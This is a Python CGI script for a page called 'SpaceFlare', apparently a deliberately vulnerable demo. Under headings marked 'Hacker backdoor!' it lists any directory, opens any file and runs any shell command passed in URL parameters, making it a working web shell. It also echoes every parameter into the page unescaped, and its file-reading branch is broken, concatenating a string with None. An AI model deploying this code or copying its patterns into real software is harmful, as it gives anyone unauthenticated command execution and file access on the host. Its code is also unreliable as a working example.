#!/usr/bin/python3

import os, sys, subprocess, cgi, cgitb 

# Create instance of FieldStorage 
form = cgi.FieldStorage() 

print("Content-Type: text/html")
print("")

print("<!DOCTYPE html><HTML><HEAD>")
print("<TITLE>SpaceFlare</TITLE><meta charset=\"utf-8\">")
print("<style>body{font-family:-apple-system,BlinkMacSystemFont,avenir next,avenir,segoe ui,helvetica neue,helvetica,Cantarell,Ubuntu,roboto,noto,arial,sans-serif;background-color:#fff;margin:0}main{margin-bottom:0.1rem}header{padding:0.1rem;background:linear-gradient(60deg,#d1ebff,#99c2ff);margin-bottom:0.1rem}.content{max-width:1300px;margin:0 auto;padding:0 1rem}h1{text-align:center}h2{border-bottom:1px solid #aaa;padding-bottom:.5rem}pre{padding:0.5rem;border:1px solid #ccc;font-size:.9rem;border-radius:5px;background-color:#f6f6f6;font-family:Menlo,Consolas,Monaco,Liberation Mono,Lucida Console,monospace;white-space:pre-wrap}.var{font-weight:700}</style>")
print("</HEAD><BODY><main>")
print('<header><h1>🚀 SpaceFlare 🛰️</h1></header>')
print('<div class="content">')

# Platform
print('<h2>Platform</h2>')
print('<pre><code>', end='')
print('<span class="var">sys.platform = ' + '</span>'+ sys.platform)
print('</code></pre>')

# URL Parameters
print('<h2>URL Parameters</h2>')
print('<pre><code>', end='')
for k in form.keys():
    print('<span class="var">'+ k + ' = ' + '</span>'+ form.getvalue(k))
print('</code></pre>')

# Hacking!
path = form.getvalue("listdir")
if path:
    print('<h2>🥷 Hacker backdoor! Try reading \'' + path + '\' directory!</h2>')
    print('<pre><code>', end='')
    try:
        dirs = os.listdir(path)
        for entry in dirs:
            print('<span class="var">'+ entry + '</span>')
    except Exception as e:
        print("ERROR! " + str(e))
    print('</code></pre>')

filepath = form.getvalue("open")
if filepath:
    print('<h2>🥷 Hacker backdoor! Try opening file: \'' + filepath + '\'</h2>')
    file = open(filepath, 'r')
    if file:
        print('<pre><code>', end='')
        print('<span class="var">'+ print(file.read()) + '</span>')
        print('</code></pre>')

command = form.getvalue("run")
if command:
    print('<h2>🥷 Hacker backdoor! Try running command: \'' + command + '\'</h2>')
    print('<pre><code>', end='')
    try:
        print('<span class="var">')  
        output = subprocess.run(command, capture_output=True, shell=True)   
        print("[stdout]")
        print(output.stdout.decode("utf-8"))
        print("[stderr]")
        print(output.stderr.decode("utf-8"))
        print('</span>')
    except Exception as e:
       print("ERROR! " + str(e))
    print('</code></pre>')


print("</div></main></BODY></HTML>")
